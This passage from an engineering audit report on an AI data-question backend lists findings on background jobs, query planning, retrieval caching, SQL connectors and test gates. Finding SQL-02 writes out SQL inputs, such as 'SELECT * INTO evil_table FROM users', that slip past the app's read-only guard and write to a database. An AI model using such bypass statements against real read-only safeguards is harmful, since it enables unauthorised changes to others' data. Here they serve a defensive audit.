web: cd backend && alembic upgrade head && uvicorn app.main:app …
worker: cd backend && arq app.worker.WorkerSettings
```
- **Severity**: high — four counters were added specifically so a silent degradation would become a trendable number, and none of them is reachable. It also makes `indexing_runs_total{status="failed"}` unanswerable, which is the headline SLI for this whole module.
- **Confidence**: certain for the code path. What would settle the operational half: `curl /api/metrics/prometheus | grep indexing_runs_total` on production — expected to return nothing.

---

## OPS-04 — Four maintenance jobs are gated behind 24 hours of uninterrupted uptime, on a platform that restarts the dyno roughly daily

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/main.py:1487-1503` (`_maintenance_loop`)
- **What is wrong**: the loop's first action is `await asyncio.sleep(interval_seconds)` where `interval_seconds = maintenance_interval_hours * 3600` (default 24 h, `config.py:536`). The timer is measured from process start and there is no persistent "last run" marker anywhere. `_periodic_learning_decay` and `_periodic_insight_maintenance` are additionally invoked at boot (`main.py:123-124`), but `_freshness_reconcile`, `_sweep_telemetry_retention`, `_prune_analytics_journal` and `_reconcile_billing` are called from **nowhere else** — grep below. Contrast `_backup_cron_loop:1437-1442`, which anchors to a wall-clock hour and therefore survives restarts.
- **Concrete failure**: a commit is pushed to `main` at 09:00; `deploy.yml` restarts `web`; the maintenance timer resets to 0/86400. Heroku cycles the dyno at 03:00 the next morning; it resets again. `TelemetryRetention().sweep` never runs, so `indexing_run_events` grows past `indexing_run_events_ttl_days=30` and `error_log` past `error_log_ttl_days=90` forever; `analytics_imports` is never pruned past its 400-day horizon; and `BillingService.reconcile` — the sweep that repairs subscriptions a missed Stripe webhook left wrong — never executes, so a paying customer whose `checkout.session.completed` was not delivered has no automated repair at all. Nothing logs: the loop is silent until it fires.
- **Evidence**:
```
$ grep -rn "_sweep_telemetry_retention\|_prune_analytics_journal\|_reconcile_billing\|_freshness_reconcile" backend/app --include='*.py'
app/main.py:682:async def _reconcile_billing() -> None:
app/main.py:762:async def _freshness_reconcile() -> None:
app/main.py:1500:                await _freshness_reconcile()
app/main.py:1501:                await _sweep_telemetry_retention()
app/main.py:1502:                await _prune_analytics_journal()
app/main.py:1503:                await _reconcile_billing()
app/main.py:1510:async def _sweep_telemetry_retention() -> None:
app/main.py:1527:async def _prune_analytics_journal() -> None:
```
```python
1489	    while True:
1490	        try:
1491	            await asyncio.sleep(interval_seconds)   # <- 24 h before the FIRST run
```
- **Severity**: high — this is the same shape as the hourly-cron bug fixed on 2026-09-08 (an intention the clock silently discards), and it is silent in the same way: a skipped interval logs nothing.
- **Confidence**: certain for the code. To settle the production half: `heroku logs --source app | grep -c "insight maintenance\|deleted .* old trace"` over a week, or check whether any `analytics_imports` row older than 400 days exists.

---

## OPS-05 — Four routes tell the user the job is queued after an enqueue that returned `None`

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/api/routes/repos.py:301-310`, `backend/app/api/routes/projects.py:660-675`, `backend/app/api/routes/runs.py:172-181`, `backend/app/api/routes/connections.py:136-146` and `:196-211`
- **What is wrong**: `enqueue` returns `None` on failure rather than raising (`task_queue.py:141`, `:152`), and with `allow_in_process=False` — correctly set at all these sites — a Redis fault produces exactly that. Every one of these callers discards the return value. Worse, each has already minted an `IndexingRun` in status `running` (or set `indexing_status='running'`) before enqueueing, so the failure leaves a row asserting work is in progress and an HTTP body asserting the same. This is the identical defect that was fixed inside `queue_embedding_reindex` and `StaleRunReaper._requeue` on 2026-09-09; the user-facing callers were not.
- **Concrete failure**: Redis is briefly unreachable. A user presses "Re-index repository". `RunCoordinator.start` writes a `running` row. `enqueue` logs `ARQ enqueue failed for run_repo_index and in-process execution is not an acceptable substitute…` at ERROR and returns `None`. The route returns `{"status": "queued", "run_id": …}`. The UI spins. `_find_active` now refuses every retry the user attempts, because the row's heartbeat is under `stale_running_heartbeat_timeout_seconds` (`run_coordinator.py:240-246`), for a full five minutes — after which the reaper flips it, writes `REAP_ERROR`, and tries the same broken enqueue again.
- **Evidence** (`repos.py:300-310`):
```python
if task_queue.is_arq_active():
    await task_queue.enqueue(
        "run_repo_index",
        allow_in_process=False,
        task_id=f"repo_index:{project_id}:{uuid.uuid4().hex[:8]}",
        project_id=project_id, force_full=force_full, wf_id=wf_id,
    )
    return {"status": "queued", "run_id": run.id, "workflow_id": wf_id, "resumed": resumed}
```
- **Severity**: high — an outcome computed from the input rather than from what happened, on the paths a person actually presses, and it leaves a `running` row that blocks the user's own retry.
- **Confidence**: certain.

---

## OPS-06 — `run_db_index`'s whole-job ARQ ceiling is the same 1800 s as the budget of one of its steps

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/worker.py:422-424` (registered bare) and `:447` (`job_timeout = 1800`), against `backend/app/config.py:492` (`db_index_fetch_samples_budget_seconds: int = 1800`) and `backend/app/knowledge/db_index_pipeline.py:533`, `:742`, `:837`
- **What is wrong**: `run_db_index` and `run_code_db_sync` are the only long jobs still inheriting `WorkerSettings.job_timeout`; `run_repo_index`, `run_daily_project_knowledge_sync` and `run_analytics_collect` each got `_arq_func_with_timeout`. `fetch_samples` may legitimately consume the entire 1800 s by design (`db_index_pipeline.py:533`) — and it is step 2 of at least six. `validate_tables` (LLM analysis of up to `db_index_max_tables_analyzed=500` tables, `:837`), the persist step (`:1017`), `generate_summary` (a second LLM call, `:1084`) and the schema-retriever build (`:1142`) all run afterwards, with a guaranteed zero seconds left. The step budget bounds the sub-step and the job budget bounds the job, and nobody set them against each other.
- **Concrete failure**: a customer's database is slow enough that sampling 213 tables exhausts the budget. `SamplingBudget` correctly stops, logs the skipped tables, increments `db_index_sample_budget_exhausted_total`, and the run continues to `validate_tables` — where arq cancels it at 1800.00 s. The user sees `indexing_status='failed'` for a run whose degradation logic worked perfectly. The counter that would have explained it is in the worker's heap (OPS-03).
- **Evidence**:
```python
# worker.py
422	    functions = [
423	        run_db_index,
424	        run_code_db_sync,
...
447	    job_timeout = 1800  # 30 min
# config.py
492	    db_index_fetch_samples_budget_seconds: int = 1800
```
The inheritance rule is stated by the codebase itself at `worker.py:426-429` and `config.py:612-614` ("it inherited ARQ's class-level `job_timeout = 1800`").
- **Severity**: high — a budget that can consume 100 % of its own container is not a budget, and the resulting cancellation looks like a failure of the customer's database rather than of the configuration.
- **Confidence**: certain on the arithmetic. One thing does **not** reconcile and should be checked: `CLAUDE.md` records `trigger='auto'` db-index runs of 30 279 s and 23 198 s that "all completed". Under ARQ that is impossible against a 1800 s ceiling. Either those runs took the in-process branch (`connections.py:148`, i.e. `is_arq_active()` was false), or the ceiling is not reaching this function — and if it is the latter, `run_db_index` currently has no ceiling at all. `heroku config:get REDIS_URL` plus one `grep 'run_db_index' worker logs for TimeoutError` settles it.

---

## OPS-07 — A partial enqueue failure still advances the embedding fingerprint, leaving those projects' vectors dropped and unrebuildable

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/ops/embedding_reconcile.py:90-111`, with `backend/app/services/embedding_reindex.py:65` (the drop) and `:76` (the enqueue)
- **What is wrong**: the 2026-09-09 fix guards only the all-or-nothing case: `if ids and queued == 0`. When *some* projects enqueue and others do not, line 110 advances `stored.value = current` and returns `"reindexed"`. `queue_embedding_reindex` drops each project's collection **before** attempting its enqueue (`embedding_reindex.py:65` then `:76`), so the projects that failed have lost their vectors and the marker now asserts the rebuild happened. The nightly cron is `force_full=False` and cannot redo it. The reasoning written into the `queued == 0` branch — "collections dropped, nothing queued, and a marker asserting the rebuild already ran" — applies verbatim to the partial case.
- **Concrete failure**: `SYMBOL_UID_SCHEMA` is bumped and deployed with five projects. Redis accepts three enqueues and then the connection drops. `queued == 3`, `len(ids) == 5`. `queue_embedding_reindex` logs the two ERRORs; `reconcile_embeddings` logs a WARNING `queued 3 of 5 project(s)` and advances the marker. The next boot reports `unchanged`. Two projects retrieve against an empty vector store forever, and the only recovery is a hand-enqueued full re-index nobody knows to run.
- **Evidence**:
```python
 92	            if ids and queued == 0:
...
109	                return ReconcileResult("error", fingerprint=current)
110	            stored.value = current
111	            await session.commit()
112	            log = logger.info if queued == len(ids) else logger.warning
```
- **Severity**: high — silent, permanent data loss on the retrieval path, and the guard that exists proves the failure direction was already understood.
- **Confidence**: certain.

---

## OPS-08 — The worker will run eight repo indexes at once, and one already exceeds the dyno's memory

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/worker.py:446` (`max_jobs = 8`) against `backend/app/ops/embedding_reconcile.py:89-90`
- **What is wrong**: `reconcile_embeddings` enqueues one `force_full` `run_repo_index` per project in a single loop with no batching, pacing or per-kind concurrency cap. arq's only concurrency control is `max_jobs`, set to 8. `CLAUDE.md` records a *single* repo index reaching 1 053 MiB against a 512 MiB quota, and 1 094 MiB against Standard-2X's 1 GiB. The database's partial unique index prevents two runs of the *same* project, which is not the constraint that matters here — eight runs of eight different projects are all legal.
- **Concrete failure**: an operator bumps `CHROMA_EMBEDDING_MODEL` (or any of `SYMBOL_UID_SCHEMA` / `GRAPH_EXTRACTION_SCHEMA` / `SYMBOL_CHUNK_ID_SCHEMA` changes on a normal deploy) on a deployment with five projects. Boot enqueues five `force_full` rebuilds. The worker takes all five immediately, each entering `code_symbol_embed`. The dyno is R15-killed within minutes; the orphan sweep on the replacement re-enqueues all five; the cycle repeats. The single-project anchor (`esim-php`) is the only reason this has never been observed.
- **Evidence**:
```python
# ops/embedding_reconcile.py
89	            ids = list((await session.scalars(select(Project.id))).all())
90	            jobs = await queue_embedding_reindex(ids)
# worker.py
446	    max_jobs = 8
```
- **Severity**: high — the single most memory-sensitive job in the system has an 8-wide concurrency limit and a fan-out path that reaches it, on a dyno where one instance already runs over quota.
- **Confidence**: certain on the code; the production consequence is untested only because the deployment has one project. `heroku ps` plus `SELECT count(*) FROM projects` confirms the exposure.

---

## ORCH-01 — `query_analytics_source` is in the planner's prompt and in the executor's dispatch, but not in the plan validator's tool set, so no analytics stage can ever be planned

*`ORCH` — Orchestrator and pipeline*

- **Where**: `backend/app/agents/query_planner.py:24-32` (`_VALID_TOOLS`), enforced at `:77-78`, mirrored into the tool schema at `:139-142`; prompt that asks for it at `backend/app/agents/prompts/planner_prompt.py:49-59`
- **What is wrong**: `PLANNER_SYSTEM_PROMPT` documents `query_analytics_source` and gives an explicit "CROSS-SOURCE RECIPE" (`planner_prompt.py:57-59`), `StageExecutor._execute_stage` dispatches it (`stage_executor.py:538`), and `_run_complex_pipeline` advertises the source to the planner (`orchestrator.py:2409-2410`). `_VALID_TOOLS` was never extended. `_CREATE_PLAN_TOOL`'s `tool` enum is literally `list(_VALID_TOOLS)`, so the tool schema does not even offer the name to the model, and any plan that follows the prose is rejected by `_validate_plan_structure`. `data_retrieval_tools` at `:83-88` omits it too, so an analytics-only plan fails a second check.
- **Concrete failure**: On a project with GA4 + Postgres, "compare GA4 sessions with signups per day" routes to the pipeline (`needs_multiple_data_sources`). The planner emits the documented 4-stage recipe. `_llm_plan` rejects it twice, returns `None`, `plan()` falls back to `_quick_data_plan(fallback_tool=...)` — and because `has_connection` wins the ladder at `orchestrator.py:2386-2396`, the fallback tool is `query_database`. The one-stage plan then trips the `data_stage_count <= 2` bounce (`:2456-2463`) into the flat loop. The analytics half of the question is silently dropped and the user pays two planner LLM calls for it.
- **Evidence**:
```
$ .venv/bin/python -c "from app.agents.query_planner import _validate_plan_structure, _CREATE_PLAN_TOOL; ..."
errors: ["Stage 'an1' has invalid tool 'query_analytics_source'"]
enum offered to the model: ['analyze_git', 'analyze_results', 'process_data',
                            'query_database', 'query_mcp_source', 'search_codebase', 'synthesize']
analytics-only errors: ["Stage 'an1' has invalid tool 'query_analytics_source'",
                        'Plan must include at least one data-retrieval stage']
```
- **Severity**: high — a shipped, documented capability (`[1.16.0]` GA4 cross-source analysis on the pipeline path) is unreachable, and the failure mode is a wrong-scope answer rather than an error.
- **Confidence**: certain. The existing tests cover both halves and neither covers the seam: `tests/unit/agents/test_planner_source_availability.py:37` asserts the name is in the prompt, `tests/unit/agents/test_analytics_pipeline_stage.py:144` asserts the executor dispatches it; nothing asserts the validator accepts it.

---

## ORCH-02 — a correct zero-row result fails the pipeline stage, while the identical result is only a warning in the flat loop

*`ORCH` — Orchestrator and pipeline*

- **Where**: `backend/app/agents/stage_executor.py:811-820`, reading the directive produced at `backend/app/agents/result_validation.py:149-154`
- **What is wrong**: `ResultValidation.evaluate` returns `action="requery"` for any result with `row_count == 0` when `settings.query_empty_result_retry` is on (default `True`, `config.py:338`). `_run_sql_stage` maps both `block` and `requery` onto `StageResult(status="error")`. The flat loop maps the same directive onto an appended text warning (`sql_agent.py:1113-1118`) and keeps the answer. So one gate produces two opposite outcomes depending on which execution path the router picked — and the pipeline's is the wrong one, because the SQL agent only returns a clean 0-row result *after* the ValidationLoop has already spent its empty-result retries and concluded "zero is the truth" (`app/core/validation_loop.py:534-556`).
- **Concrete failure**: "How many refunds were there in July?" against a month with no refunds. The SQL agent returns `status="success"`, `QueryResult(columns=['n'], rows=[], row_count=0)`. The stage becomes `status="error", error_category="data_missing"` — non-retryable, so `_execute_with_retries` short-circuits, `_process_one_stage` returns `stage_failed(replan_eligible=True)`, and the orchestrator burns up to `max_pipeline_replans=2` planner LLM calls before returning a failed pipeline for a question whose answer was zero. This also defeats `_ensure_validation_criteria`'s deliberate `min_rows=0` injection (`adaptive_planner.py:361-364`), which never gets to run.
- **Evidence**:
```
$ .venv/bin/python  # StageExecutor._run_sql_stage with a stub SQL agent returning 0 rows
query_empty_result_retry = True
status = error
error_category = data_missing
error = query returned 0 rows
retryable = False
```
- **Severity**: high — a wrong terminal outcome on the most ordinary data case (a filter matching nothing), plus wasted replan budget.
- **Confidence**: certain (reproduced above).

---

## ORCH-03 — the LayerChecker rejects a parallel layer and the replan then seeds the rejected results straight into the next plan

*`ORCH` — Orchestrator and pipeline*

- **Where**: rejection at `backend/app/agents/stage_executor.py:358-378`; the results it rejects were already committed at `:482`; they are re-seeded at `backend/app/agents/orchestrator.py:2899-2902`
- **What is wrong**: `_process_one_stage` writes each stage's result into `stage_ctx` (`:482`) *before* `execute()` runs the cross-item gate on the finished batch. When the gate fails, `execute()` returns `stage_failed` carrying that same `stage_ctx`. `_run_pipeline_replans` then copies every result whose `status` is `"success"` or `"degraded"` into the new plan's context — which includes exactly the siblings the checker just refused, since the checker never changes their status. The replanned plan is free to depend on them (`allowed_dep_ids` in `adaptive_planner.py:125-127` is built from the same set), so they are never re-run and the convergence consumes them.
- **Concrete failure**: A 3-stage parallel layer where one `query_database` stage returns rows with a ragged row (`layer_checker.py:147-156`, item `malformed`). Verdict fails, `replan_eligible = any(s.replan_on_failure)` is `True` (default, `stage_context.py:63`), the replan produces a plan whose `synthesize` stage `depends_on` the three ids, all three seeded results are present, `execute()` sees them in `completed_ids` and dispatches nothing — the malformed result reaches synthesis unchanged. `layer_checker.py:80-83` states the requirement this violates verbatim: *"The convergence must depend on this verdict rather than on the branches, or the gate has a bypass and the shape is decoration."*
- **Evidence**:
```python
# stage_executor.py:482 — result committed before the layer gate runs
        stage_ctx.set_result(stage.stage_id, result)
# stage_executor.py:363-378 — gate fails, same stage_ctx handed back
                if not verdict.passed:
                    return _StageExecutorResult(status="stage_failed", stage_ctx=stage_ctx, ...)
# orchestrator.py:2899-2902 — every "success" result, flagged or not, is carried over
            for sid, sr in completed.items():
                if sr.status in ("success", "degraded"):
                    new_stage_ctx.set_result(sid, sr)
```
- **Severity**: high — a quality gate that reports a rejection and is then overruled by the recovery path is worse than no gate, because the SSE `layer_verdict` event tells the operator it fired.
- **Confidence**: likely. What would settle it: a test that fails a layer (e.g. a ragged `QueryResult` in one of three parallel stages), forces one replan whose new plan keeps the same stage ids, and asserts the flagged stage is re-executed rather than seeded.

---

## RET-02 — no gate exercises that filter; the two tests that "validate" it assert arithmetic, and the real-retriever eval builds the retriever without it

*`RET` — Retrieval*

- **Where**: `backend/tests/unit/eval/test_real_retriever_eval.py:135-145`; `backend/tests/unit/test_cosine_distance_validation.py:29-42`; `backend/tests/unit/test_retrieval_floor.py:56-74,82-104`.
- **What is wrong**: `_retriever()` — the helper the Ш1 gate calls "the production `HybridRetriever`, with production defaults unless overridden" — passes `rrf_k`, `min_score` and `max_rank` and **omits `chroma_max_distance`**, whose constructor default is `None` (`hybrid_retriever.py:89`), i.e. filter off. The file's docstring claims "`min_score`, `max_rank`, the timeout, the degradation labels — is entirely real"; the one parameter that can delete a whole leg is the one not wired. The two tests that do name the threshold assert `settings.rag_relevance_threshold == 0.45` and that `1.0 - 0.45 >= 0.55` — an identity, true of any number, that measures nothing about the embedder. `test_retrieval_floor.py:59-61` feeds hand-written distances `0.30` and `0.60`, chosen to straddle the constant.
- **Concrete failure**: setting `RAG_RELEVANCE_THRESHOLD=0.05` (which would return zero dense hits for every query in the product) leaves the entire retrieval suite green: the eval gate never passes the value, and both "validation" tests would fail only on the literal `0.45` moving — they cannot distinguish 0.45 from a working value because neither embeds anything.
- **Evidence**:
  ```python
  # tests/unit/eval/test_real_retriever_eval.py:139-145
  params: dict[str, Any] = {
      "rrf_k": settings.hybrid_rrf_k,
      "min_score": settings.hybrid_min_score,
      "max_rank": settings.hybrid_max_rank,
  }
  params.update(kwargs)
  return HybridRetriever(bm25=bm25, vector_store=dense, **params)
  ```
  `grep -rn "chroma_max_distance" tests/` returns only stub-distance tests (`test_retrieval_floor.py:66`, `test_hybrid_retriever.py:69`, `test_w2_low_batch.py:139,157`) — never `settings.rag_relevance_threshold`.
- **Severity**: high — this is the gate that exists specifically because "both retrieval defects of 2026-09 passed CI green", and it reproduces the omission for the third one.
- **Confidence**: certain.

---

## RET-03 — when *both* legs come back empty, nothing is emitted at all: total retrieval failure is the only silent case

*`RET` — Retrieval*

- **Where**: `backend/app/knowledge/hybrid_retriever.py:171-189`.
- **What is wrong**: the degradation branch is `if bm25_empty and not chroma_empty … elif chroma_empty and not bm25_empty`. Both conditions require the *other* leg to have hits, so zero-and-zero emits no event and increments no counter. Partial degradation is loud; complete failure is mute. The caller receives `[]`, which every consumer reads as "this project has no relevant documents".
- **Concrete failure**: the exact production shape after a restart where `bm25_local_reconcile` could not rebuild (it logs and continues, `ops/bm25_local_reconcile.py:191-198`) combined with RET-01: BM25 returns `[]` with `no_snapshot`, dense returns `[]` after the distance filter, `retrieval_degraded_total` stays at 0, no `retrieval_degraded` SSE event reaches the reasoning panel, and the answer is synthesised with no retrieved context and no caveat.
- **Evidence**:
  ```python
  bm25_empty = len(bm25_results) == 0
  chroma_empty = len(chroma_results) == 0
  if bm25_empty and not chroma_empty and bm25_reason in BM25_DEGRADED_REASONS:
      await emit_retrieval_degraded(..., leg="bm25", reason=bm25_reason)
  elif chroma_empty and not bm25_empty:
      await emit_retrieval_degraded(..., leg="dense", reason="empty_cause_unknown")
  ```
- **Severity**: high — the signal built to make a degraded retriever visible is absent in exactly the worst state, and `bm25_reason` is already in hand to describe half of it.
- **Confidence**: certain.

---

## RET-05 — every ContextPack request builds a fresh `KnowledgeCatalogService`, so the full BM25 corpus is gunzipped and re-indexed per question

*`RET` — Retrieval*

- **Where**: `backend/app/agents/context_loader.py:130` (`catalog = KnowledgeCatalogService(vector_store=self._vector_store)`, inside `build_context_pack`), `backend/app/services/knowledge_catalog_service.py:62-66` and `:100-112`, `backend/app/knowledge/bm25_index.py:178-182` and `:302-305`.
- **What is wrong**: the snapshot cache is an **instance** attribute (`self._snapshots` on `BM25Index`), and the catalog service is a local variable created per call. Each request therefore constructs a new `KnowledgeCatalogService` → new `HybridRetriever` → new `BM25Index` with an empty cache → `load_with_reason` reads the `.json.gz` off disk, parses it, and reconstructs `BM25Okapi(tokenized)` over the entire project corpus. The two long-lived retrievers (`ContextLoader`, `KnowledgeAgent`, both reachable from the module-scope `ConversationalAgent`) do cache; this third path never does.
- **Concrete failure**: measured at production shape — CLAUDE.md records `bm25_build: completed (31 392 chunks from 763 docs)` for `esim-php`. Building that snapshot and loading it from a fresh `BM25Index` costs **2.23 s wall clock and ~245 MiB of RSS**, paid on every question that assembles a ContextPack, and freed only when the service is collected. Two concurrent questions hold two copies; the web dyno's `/api/chat/ask` concurrency cap is above one.
- **Evidence**:
  ```
  snapshot on disk:        37.8 MB (gzip)
  cold load wall clock:    2.23 s
  process peak RSS:        702 MiB (baseline before load 457 MiB)
  docs in snapshot:        31392
  ```
  (script: fresh `BM25Index(dir).load(key)` after `build`, `resource.ru_maxrss`; synthetic corpus of 31 392 docs × 110 tokens over a 20 000-term vocabulary.) Same measurement on a 213-table schema snapshot: 22.8 ms cold, 0.0 ms warm — `SchemaRetriever` is likewise rebuilt per question at `app/agents/sql_agent.py:1497`, where the comment claims the deserialisation is paid only by "every project's first question" after a deploy.
- **Severity**: high — seconds of added latency and a quarter-gigabyte transient on the dyno type that has repeatedly been SIGKILLed for memory, for a cache that already exists and is simply not shared.
- **Confidence**: certain for the code path and the measurement; the exact RSS depends on vocabulary entropy, which a real corpus would lower somewhat.

---

## RET-06 — the web dyno's lexical corpus is frozen at the first read after boot and nothing can refresh it

*`RET` — Retrieval*

- **Where**: `backend/app/ops/bm25_local_reconcile.py:22-26` (contract) and `:180-183` (missing-only skip), `backend/app/knowledge/bm25_index.py:302-305` (permanent in-process cache), `backend/app/knowledge/pipeline_runner.py:1515-1548` (`_repair_bm25_if_stale`, worker-only).
- **What is wrong**: `Procfile` splits `web` and `worker` onto separate filesystems, so the reconcile rebuilds each process's own snapshot at start-up — but **only when the file is absent**, deliberately. Every writer of a fresh snapshot (`_run_bm25_build`, `_repair_bm25_if_stale`) runs in the worker. Nothing on the web dyno ever rewrites the file after boot, and `BM25Index._snapshots` caches the loaded snapshot for the life of the process with no invalidation and no TTL. So the web dyno's lexical leg serves the corpus as it stood at boot, indefinitely, while the dense leg (pgvector, shared Postgres) is current.
- **Concrete failure**: the nightly `daily_sync` re-indexes at 03:00 on the worker and writes 763 fresh documents to Postgres and new vectors to `doc_embeddings`. Until the web dyno restarts, a question about a file added that night fuses a *current* dense hit against a lexical corpus that has never seen it; a file deleted that night still returns a BM25 hit whose `document` text comes from `snap.raw_texts` (`bm25_index.py:414`) and whose `doc_id` no longer exists in the vector store. `query_with_reason` reports `"ok"` throughout — staleness has no reason code, and `BM25_DEGRADED_REASONS` has no member for it.
- **Evidence**: `grep -rn "BM25Index(" app/` — the three read-path constructions (`context_loader.py:80`, `knowledge_agent.py:61`, `knowledge_catalog_service.py:101`) never call `build` or `delete`; the only `build` callers are `pipeline_runner.py`, `bm25_local_reconcile.py` and `schema_retriever.py`. `bm25_local_reconcile.py:181`: `if await asyncio.to_thread(bm25.indexed_sha, pid) is not None: result.skipped_present += 1; continue`. The snapshot carries `indexed_sha` and nothing on the read path compares it to anything.
- **Severity**: high — silent, and it makes the two legs disagree about what the repository contains, which is the failure mode the `doc_id`-fusion contract in `bm25_corpus.py:19-22` exists to prevent.
- **Confidence**: certain for the code paths. The observed staleness window depends on how often Heroku cycles the web dyno (CLAUDE.md records roughly daily); what would settle it is comparing `indexed_sha` in the web dyno's snapshot against `project_repositories.last_indexed_commit`.

---

## SQL-02 — SSH-exec mode establishes no engine-level read-only session; `is_read_only` is never applied to the CLI, so the documented layering collapses to the regex alone

*`SQL` — Connectors, SQL safety, SSH*

- **Where**: `backend/app/connectors/ssh_exec.py` — `is_read_only` appears exactly once, at `:280`, and only to decide retry idempotency. Contrast `postgres.py:119`, `mysql.py:66`, `clickhouse.py:119`, `sqlite.py:89`.
- **What is wrong**: `CLAUDE.md` states read-only enforcement is layered — a DB-enforced session under `SafetyGuard`. The SSH-exec connector has no lower layer: `EXEC_TEMPLATES` (`exec_templates.py:52-124`) carry no `-c "SET default_transaction_read_only=on"`, no `--init-command`, no `readonly=1`. So for every `ssh_exec_mode` connection the *only* thing standing between a query and a write is the statement-initial allow-list, and that allow-list has known gaps. Worse, `ssh_exec.py:277-282` justifies re-sending an interrupted command with *"A read-only **connection** makes anything repeatable, because the DB session itself refuses writes"* — a claim that is false in this exact file.
- **Concrete failure**: on an `ssh_exec_mode`, `is_read_only=True` Postgres connection, `SELECT * INTO evil_table FROM users` passes `SafetyGuard` (leading token `SELECT`; no denylist hit) and creates a table, because psql runs it in a normally-writable session. On the native connector the same statement is refused by `default_transaction_read_only`. Second-order: because `is_read_only` is `True`, `_run_command(..., idempotent=True)` will **re-send that same CREATE-by-SELECT** after a mid-flight reconnect (`ssh_exec.py:243-250`), which is exactly the F-SSH-07 hazard the flag exists to prevent.
- **Evidence**:
  ```
  $ grep -n is_read_only app/connectors/ssh_exec.py
  280:  repeatable = bool(self._config and self._config.is_read_only) or is_read_only_statement(
  ```
  ```
  PASS  [postgres] 'SELECT * INTO evil_table FROM users'
  PASS  [postgres] 'EXPLAIN ANALYZE SELECT * INTO evil FROM users'
  ```
  (`SafetyGuard(READ_ONLY).validate`, run above.)
- **Severity**: **high** — a vision.md §7 #1 invariant is unenforced for a whole connector class, and it is the connector class where the app-layer guard is weakest (SQL-01).
- **Confidence**: certain. `SELECT … INTO` is the cheapest demonstration; adding `default_transaction_read_only=on` to the psql/mysql/clickhouse templates when `config.is_read_only` would settle it.

---

## SQL-03 — MySQL's row cap does not stop the transfer, and a timed-out query returns a protocol-desynced connection to the pool

*`SQL` — Connectors, SQL safety, SSH*

- **Where**: `backend/app/connectors/mysql.py:143-158` (`async with pool.acquire()` / `SSDictCursor` / `fetchmany`), `:166` (`asyncio.wait_for`). Compare `postgres.py:194-205`, which handles precisely this and MySQL does not.
- **What is wrong**: two defects sharing one cause. (a) `SSDictCursor` is unbuffered, so `fetchmany(MAX_RESULT_ROWS + 1)` reads 10 001 rows — but closing the cursor on `__aexit__` calls `_finish_unbuffered_query()`, which the driver itself documents as spinning until EOF because MySQL cannot be told to stop sending. So the cap bounds *memory*, not the wire, and the whole result set is transferred before `_run()` returns. (b) When `wait_for` cancels mid-fetch or mid-drain, nothing terminates the connection; `__aexit__` releases it and `Pool.release` puts it back on `_free` because `get_transaction_status()` is false under `autocommit=True`. Postgres's connector calls `conn.terminate()` for exactly this reason and says so in a comment; MySQL has no equivalent.
- **Concrete failure**: `SELECT id FROM events` on a 200 M-row table. The connector reads 10 001 rows quickly, then blocks draining 200 M rows; `wait_for` fires at `query_timeout_seconds` (30, `config.py:340`) *during the drain*; the user is told "Query timed out after 30s" although the answer was already in hand; and the half-drained connection re-enters the pool. The next query on that connection reads the previous query's leftover row packets as its own result — wrong rows returned with no error.
- **Evidence**:
  ```
  # .venv/lib/python3.12/site-packages/aiomysql/connection.py:1256-1260
  async def _finish_unbuffered_query(self):
      # ... there is, in fact, no way to stop MySQL from sending all the data after
      # executing a query, so we just spin, and wait for an EOF packet.
      while self.unbuffered_active:
  # aiomysql/pool.py release(): if not conn.closed: in_trans = conn.get_transaction_status()
  #   if in_trans: conn.close() ... else: self._free.append(conn)
  ```
  ```python
  # postgres.py:194-205 — the handling MySQL lacks
  except (asyncio.CancelledError, TimeoutError):
      conn.terminate()
  ```
- **Severity**: **high** — (a) is a guaranteed latency/timeout defect on any large table; (b) is silent wrong-answer territory on a shared pool.
- **Confidence**: (a) certain (driver source). (b) likely — settled by a test that times out a slow `SELECT` against a real MySQL, then runs a second query on the same pool and asserts the columns match the second query.

---

## SQL-04 — The SSH-exec connector truncates output mid-line at 10 MB and reports `truncated=False`; it applies no row cap at all

*`SQL` — Connectors, SQL safety, SSH*

- **Where**: `backend/app/connectors/ssh_exec.py:255-257` (truncation) and `:296-301` (the `QueryResult` that omits `truncated=`)
- **What is wrong**: `_run_command` slices `stdout` at `MAX_OUTPUT_BYTES` (10 MB, `cli_output_parser.py:5`), logs a warning, and returns. `execute_query` then builds a `QueryResult` with `columns`, `rows`, `row_count` and `execution_time_ms` — and no `truncated` flag, which therefore defaults to `False`. It also never applies `MAX_RESULT_ROWS` or `cap_rows_by_bytes`, both of which every other connector uses. So the one connector that *cannot* stream is the one that asserts completeness. The slice lands mid-line, and `CLIOutputParser.parse_tsv_with_headers` (`cli_output_parser.py:21-23`) splits that partial line into a short row rather than discarding it.
- **Concrete failure**: `SELECT id, email FROM users` over an ssh-exec MySQL connection returning 15 MB of TSV. The user gets ~10 MB of rows, a final row with a chopped email, `truncated=False`, and `row_count` equal to what survived. Downstream every consumer that branches on `truncated` — the truncation/partial-data caveat in the agent's honesty gates, `derive_result`'s carry-forward (`base.py:353-369`), DataGate — is told the result is complete, so the model computes and states a total over a silently clipped set. This is the failure mode `derive_result` was written to make impossible, entered one layer below it.
- **Evidence**:
  ```python
  # ssh_exec.py:255-257
  if len(stdout) > MAX_OUTPUT_BYTES:
      stdout = stdout[:MAX_OUTPUT_BYTES]
      logger.warning("SSH exec output truncated to %d bytes", MAX_OUTPUT_BYTES)
  # ssh_exec.py:296-301
  return QueryResult(columns=columns, rows=rows, row_count=len(rows),
                     execution_time_ms=elapsed)      # <- no truncated=
  ```
- **Severity**: **high** — a wrong number presented as complete, which vision.md §7 lists as an invariant.
- **Confidence**: certain — the flag is absent from the constructor call and `_run_command` cannot signal it (it returns a 3-tuple of strings/int).

---

## TEST-02 — the "real retriever" eval gate passes with the dense/vector leg returning nothing at all

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/eval/test_real_retriever_eval.py:216-227` (`test_the_full_golden_set_clears_the_floors`), wired as the CI gate at `.github/workflows/ci.yml:126-127`
- **What is wrong**: The file's docstring claims the gate now measures the shipped retriever after "both retrieval defects of 2026-09 passed CI green". It is only sensitive in one direction. The fixture corpus is 29 short documents whose wording was written to match the 10 golden questions lexically, so the real BM25 leg alone clears every floor by a wide margin; the stub dense leg contributes nothing the gate depends on. A regression that empties the dense leg entirely — which is exactly incident #274, "a nominal `isinstance` emptied the RAG leg on the production backend" — leaves the gate green.
